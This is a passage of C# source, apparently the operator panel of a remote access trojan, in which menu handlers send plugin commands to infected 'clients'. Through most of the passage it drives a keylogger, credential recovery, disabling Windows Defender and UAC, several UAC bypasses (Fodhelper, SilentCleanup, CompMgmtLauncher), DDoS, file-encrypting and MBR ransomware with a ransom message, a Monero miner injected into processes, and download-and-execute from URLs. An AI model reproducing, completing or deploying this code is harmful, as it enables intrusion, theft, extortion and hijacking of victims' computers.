                    formKeylogger.Text = "keyLogger:" + clients.ID;
                    formKeylogger.F = this;
                    formKeylogger.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Keylogger");
                    formKeylogger.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void StartToolStripMenuItem2_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.SelectedItems.Count > 0)
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "blankscreen+";
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\yL9x34D8X3oO2P.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients;
                selectedClients = this.GetSelectedClients();
                for (int i = 0; i < selectedClients.Length; i++)
                {
                    ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void StartToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        try
        {
            string text;
            text = Interaction.InputBox("Alert when process activive.", "Title", "Uplay,QQ,Chrome,Edge,Word,Excel,PowerPoint,Epic,Steam");
            if (!string.IsNullOrEmpty(text))
            {
                lock (Settings.LockReportWindowClients)
                {
                    Settings.ReportWindowClients.Clear();
                    Settings.ReportWindowClients = new List<Clients>();
                }
                Settings.ReportWindow = true;
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "reportWindow";
                msgPack.ForcePathObject("Option").AsString = "run";
                msgPack.ForcePathObject("Title").AsString = text;
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients;
                selectedClients = this.GetSelectedClients();
                for (int i = 0; i < selectedClients.Length; i++)
                {
                    ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
    {
    }

    private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
    {
    }

    private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
    {
    }

    private void UpdateToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
                msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
                msgPack.ForcePathObject("Update").AsString = "true";
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\KNTmoSnG.AnarHs.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients;
                selectedClients = this.GetSelectedClients();
                foreach (Clients obj in selectedClients)
                {
                    obj.LV.ForeColor = Color.Red;
                    ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "uninstall";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\KNTmoSnG.AnarHs.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            for (int i = 0; i < selectedClients.Length; i++)
            {
                ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void RebootToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void ShutDownToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void LogoutToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void BlockToolStripMenuItem_Click(object sender, EventArgs e)
    {
        using FormBlockClients formBlockClients = new FormBlockClients();
        formBlockClients.ShowDialog();
    }

    private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
    {
        this.notifyIcon1.Dispose();
        Environment.Exit(0);
    }

    private void FileSearchToolStripMenuItem_Click(object sender, EventArgs e)
    {
        using FormFileSearcher formFileSearcher = new FormFileSearcher();
        if (formFileSearcher.ShowDialog() == DialogResult.OK && this.listView1.SelectedItems.Count > 0)
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "fileSearcher";
            msgPack.ForcePathObject("SizeLimit").AsInteger = formFileSearcher.numericUpDown1.Value * 1000L * 1000L;
            msgPack.ForcePathObject("Extensions").AsString = formFileSearcher.txtExtnsions.Text;
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileSearcher.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients obj in selectedClients)
            {
                obj.LV.ForeColor = Color.Red;
                ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
            }
        }
    }

    private void InformationToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.SelectedItems.Count > 0)
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "information";
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FBSyChwp.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients;
                selectedClients = this.GetSelectedClients();
                for (int i = 0; i < selectedClients.Length; i++)
                {
                    ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void dDOSToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.Items.Count > 0)
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "dosAdd";
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\0guo3zbo66fqoG.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients;
                selectedClients = this.GetSelectedClients();
                for (int i = 0; i < selectedClients.Length; i++)
                {
                    ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
                }
                this.formDOS.Show();
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            string text;
            text = this.textBox1.Text;
            if (!string.IsNullOrEmpty(text) && this.listView1.SelectedItems.Count > 0)
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "encrypt";
                msgPack.ForcePathObject("Message").AsString = text;
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\oYsKwDG.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients;
                selectedClients = this.GetSelectedClients();
                for (int i = 0; i < selectedClients.Length; i++)
                {
                    ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            string text;
            text = Interaction.InputBox("Password", "Password");
            if (!string.IsNullOrEmpty(text) && this.listView1.SelectedItems.Count > 0)
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "decrypt";
                msgPack.ForcePathObject("Password").AsString = text;
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("AnarHS").AsString = GetHash.GetChecksum("Plugins\\oYsKwDG.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients;
                selectedClients = this.GetSelectedClients();
                for (int i = 0; i < selectedClients.Length; i++)
                {
                    ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void DisableWDToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (this.listView1.SelectedItems.Count <= 0 || MessageBox.Show(this, "Only for Admin.", "Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) != DialogResult.Yes)
        {
            return;
        }
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\yL9x34D8X3oO2P.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if (clients.LV.SubItems[this.lv_admin.Index].Text == "Admin")
                {
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void RecordToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void RunasToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (this.listView1.SelectedItems.Count <= 0)
        {
            return;
        }
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "uac";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\KNTmoSnG.AnarHs.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
                {
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void SilentCleanupToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (this.listView1.SelectedItems.Count <= 0)
        {
            return;
        }
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\KNTmoSnG.AnarHs.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
                {
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void SchtaskInstallToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void PasswordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            //msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\maSN8TBMgUEC.dll");
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            for (int i = 0; i < selectedClients.Length; i++)
            {
                ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack.Encode2Bytes());
            }
            new HandleLogs().Addmsg("Recovering...", Color.Black);
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void FodhelperToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (this.listView1.SelectedItems.Count <= 0)
        {
            return;
        }
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass3";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\KNTmoSnG.AnarHs.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
                {
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void DisableUACToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (this.listView1.SelectedItems.Count <= 0 || MessageBox.Show(this, "Only for Admin.", "Disbale UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) != DialogResult.Yes)
        {
            return;
        }
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\fzAgyDYa.AnarHs");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if (clients.LV.SubItems[this.lv_admin.Index].Text == "Admin")
                {
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void OpenCDToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (this.listView1.SelectedItems.Count <= 0)
        {
            return;
        }
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "openCD";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\yL9x34D8X3oO2P.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            for (int i = 0; i < selectedClients.Length; i++)
            {
                ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void CompMgmtLauncherToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (this.listView1.SelectedItems.Count <= 0)
        {
            return;
        }
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass2";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
                {
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void DocumentToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void SettingToolStripMenuItem_Click(object sender, EventArgs e)
    {
        using FormSetting formSetting = new FormSetting();
        formSetting.ShowDialog();
    }

    private void SchtaskUninstallToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (this.listView1.SelectedItems.Count <= 0)
        {
            return;
        }
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "schtaskuninstall";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            for (int i = 0; i < selectedClients.Length; i++)
            {
                ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void splitContainer1_Panel1_Paint(object sender, PaintEventArgs e)
    {
    }

    private void guna2Button4_Click(object sender, EventArgs e)
    {
        using FormBuilder formBuilder = new FormBuilder();
        formBuilder.ShowDialog();
    }

    private void listView1_SelectedIndexChanged(object sender, EventArgs e)
    {
    }

    private void guna2Panel2_Paint(object sender, PaintEventArgs e)
    {
    }

    private void netstatToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Netstat.dll");
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if ((FormNetstat)Application.OpenForms["Netstat:" + clients.ID] == null)
                {
                    FormNetstat formNetstat;
                    formNetstat = new FormNetstat();
                    formNetstat.Name = "Netstat:" + clients.ID;
                    formNetstat.Text = "Netstat:" + clients.ID;
                    formNetstat.F = this;
                    formNetstat.ParentClient = clients;
                    formNetstat.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void regetidToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Regedit.dll");
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if ((FormRegistryEditor)Application.OpenForms["remoteRegedit:" + clients.ID] == null)
                {
                    FormRegistryEditor formRegistryEditor;
                    formRegistryEditor = new FormRegistryEditor();
                    formRegistryEditor.Name = "remoteRegedit:" + clients.ID;
                    formRegistryEditor.Text = "remoteRegedit:" + clients.ID;
                    formRegistryEditor.ParentClient = clients;
                    formRegistryEditor.F = this;
                    formRegistryEditor.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void startToolStripMenuItem3_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.SelectedItems.Count <= 0)
            {
                return;
            }
            using FormMiner formMiner = new FormMiner();
            if (formMiner.ShowDialog() == DialogResult.OK)
            {
                File.Exists("Plugins\\xmrig.bin");
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "xmr";
                msgPack.ForcePathObject("Command").AsString = "run";
                Settings.XmrSettings.Pool = formMiner.txtPool.Text;
                msgPack.ForcePathObject("Pool").AsString = formMiner.txtPool.Text;
                Settings.XmrSettings.Wallet = formMiner.txtWallet.Text;
                msgPack.ForcePathObject("Wallet").AsString = formMiner.txtWallet.Text;
                Settings.XmrSettings.Pass = formMiner.txtPass.Text;
                msgPack.ForcePathObject("Pass").AsString = formMiner.txtPool.Text;
                Settings.XmrSettings.InjectTo = formMiner.comboInjection.Text;
                msgPack.ForcePathObject("InjectTo").AsString = formMiner.comboInjection.Text;
                Settings.XmrSettings.Hash = GetHash.GetChecksum("Plugins\\xmrig.bin");
                msgPack.ForcePathObject("Hash").AsString = Settings.XmrSettings.Hash;
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients;
                selectedClients = this.GetSelectedClients();
                foreach (Clients obj in selectedClients)
                {
                    obj.LV.ForeColor = Color.Red;
                    ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void stopToolStripMenuItem4_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.SelectedItems.Count > 0)
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "xmr";
                msgPack.ForcePathObject("Command").AsString = "stop";
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients;
                selectedClients = this.GetSelectedClients();
                foreach (Clients obj in selectedClients)
                {
                    obj.LV.ForeColor = Color.Red;
                    ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void fromUrlToolStripMenuItem_Click(object sender, EventArgs e)
    {
        string text;
        text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url");
        if (string.IsNullOrEmpty(text) || this.listView1.SelectedItems.Count <= 0)
        {
            return;
        }
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
            msgPack.ForcePathObject("url").AsString = text;
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\yL9x34D8X3oO2P.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            for (int i = 0; i < selectedClients.Length; i++)
            {
                ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void justForFunToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Fun.dll");
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if ((FormFun)Application.OpenForms["fun:" + clients.ID] == null)
                {
                    FormFun formFun;
                    formFun = new FormFun();
                    formFun.Name = "fun:" + clients.ID;
                    formFun.Text = "fun:" + clients.ID;
                    formFun.F = this;
                    formFun.ParentClient = clients;
                    formFun.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void listView1_SelectedIndexChanged_1(object sender, EventArgs e)
    {
    }

    private void TogglePanelVisibility(bool visible)
    {
        this.guna2Panel3.Visible = visible;
        base.ActiveControl = this.listView1;
    }

    private void btnShow_Click(object sender, EventArgs e)
    {
        this.TogglePanelVisibility(visible: true);
    }

    private void btnHide_Click(object sender, EventArgs e)
    {
        this.TogglePanelVisibility(visible: false);
    }

    private void creToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void reversesMouseToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void ghostScreenToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void screenScrewToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void dontPressToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void figureOutToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void chilldeToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void sToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void guna2Button6_MouseHover(object sender, EventArgs e)
    {
        this.Pnlinfo.Visible = true;
    }

    private async void guna2Button6_MouseLeave(object sender, EventArgs e)
    {
        this.Pnlinfo.Visible = true;
        await Task.Delay(1500);
        this.Pnlinfo.Visible = false;
    }

    private void guna2Button1_Click(object sender, EventArgs e)
    {
        using Main main = new Main();
        main.ShowDialog();
    }

    private void guna2Button2_Click(object sender, EventArgs e)
    {
        using SForm2 sForm = new SForm2();
        sForm.ShowDialog();
    }

    private void guna2Button3_Click(object sender, EventArgs e)
    {
        using Form4 form = new Form4();
        form.ShowDialog();
    }

    private void listView2_SelectedIndexChanged(object sender, EventArgs e)
    {
    }

    private void ransomwareMBRMEthondToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            string text;
            text = Interaction.InputBox("Message", "Message", "All your files have been encrypted");
            if (!string.IsNullOrEmpty(text) && this.listView1.SelectedItems.Count > 0)
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "encrypt";
                msgPack.ForcePathObject("Message").AsString = text;
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\oYsKwDGMBR.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients;
                selectedClients = this.GetSelectedClients();
                for (int i = 0; i < selectedClients.Length; i++)
                {
                    ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void guna2Button5_Click(object sender, EventArgs e)
    {
        this.guna2Panel4.Visible = true;
        this.guna2Button5.Visible = false;
        this.guna2Button9.Visible = true;
    }

    private async void SendFileToDiskToolStripMenuItem_Click_1(object sender, EventArgs e)
    {
        try
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Multiselect = true;
            if (openFileDialog.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            MsgPack packet;
            packet = new MsgPack();
            packet.ForcePathObject("Pac_ket").AsString = "sendFile";
            packet.ForcePathObject("Update").AsString = "false";
            MsgPack msgpack;
            msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\PK0TcnqTGFagQTS.dll");
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients client in selectedClients)
            {
                client.LV.ForeColor = Color.Red;
                string[] fileNames;
                fileNames = openFileDialog.FileNames;
                foreach (string file in fileNames)
                {
                    await Task.Run(delegate
                    {
